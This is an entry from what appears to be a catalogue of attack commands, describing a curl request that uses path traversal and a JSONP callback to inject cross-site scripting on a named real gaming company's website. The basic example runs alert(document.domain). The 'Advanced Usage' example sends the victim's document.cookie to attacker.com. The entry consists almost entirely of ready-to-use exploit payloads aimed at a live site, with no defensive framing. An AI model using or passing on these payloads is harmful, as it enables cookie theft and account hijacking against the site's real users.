---
data: >-
  curl
  "http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//"
  -v
tags:
  - web
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:21.081Z'
id: 62552031-0f32-4de0-84b9-a44450e8a63b
verified: false
validated: true
submitted: true
---
# curl-inject-xss-callback

## Command

```bash
curl "http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//" -v
```

## Description

This curl command tests XSS injection by traversing to an internal JSONP endpoint and appending a malicious callback payload, which would execute JavaScript like alert(document.domain) in a browser context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full URL with traversal and encoded callback | Yes |
| -v | Verbose mode for detailed response inspection | No |

## Examples

### Basic Usage

```bash
curl "http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=alert%28document.domain%29//" -v
```

### Advanced Usage

```bash
curl "http://www.rockstargames.com/newswire/tags#/?tags=../../comments_dal/users/getGlobalLoginSettings.json?callback=fetch%28%27https://attacker.com/steal?cookie=%27+document.cookie%29//" -v
```

## Expected Output

Response shows JSONP with injected callback (e.g., alert(document.domain)({json data})); in browser, this executes the JS. Curl shows raw response for verification.

## Related

- [[Related Procedure: Inject-Malicious-Callback-for-XSS-in-JSONP-Endpoint]]
